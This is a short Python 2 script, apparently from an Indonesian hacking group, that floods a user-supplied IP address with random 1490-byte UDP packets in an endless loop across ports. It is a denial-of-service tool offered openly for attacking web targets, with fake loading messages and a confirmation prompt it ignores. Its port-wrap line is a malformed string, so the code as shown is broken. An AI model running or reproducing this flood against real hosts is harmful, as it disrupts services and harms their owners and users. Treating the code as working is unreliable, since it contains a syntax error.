import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet TERMUX EXE")
print "========================================================="
print "= CREATOR SC   : F3RZ-CYBER                             ="
print "= ORGANISASI   : HACKING DARK MASK SURABAYANS           ="
print "= SC GITHUB    : https://github.com/f3rz-siber/         ="
print "========================================================="
print
ip = raw_input("IP ADDRESS TARGET WEB : ")
port = input("PORT TARGET WEB      : ")

os.system("clear")
os.system("screenfetch -A CentOs")
time.sleep(5)
print "APAKAH KAMU YAKIN ?"
yes = raw_input("YA / TIDAK : ")
time.sleep(5)
print "LOADING DATABASE.."
time.sleep(3)
print "DONE"
time.sleep(4)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Menginstall %s Paket %s Ke Port %s"%(sent,ip,port)
     if "port == 65534
       port = 1"
no = input("tidak")
os.system("clear")
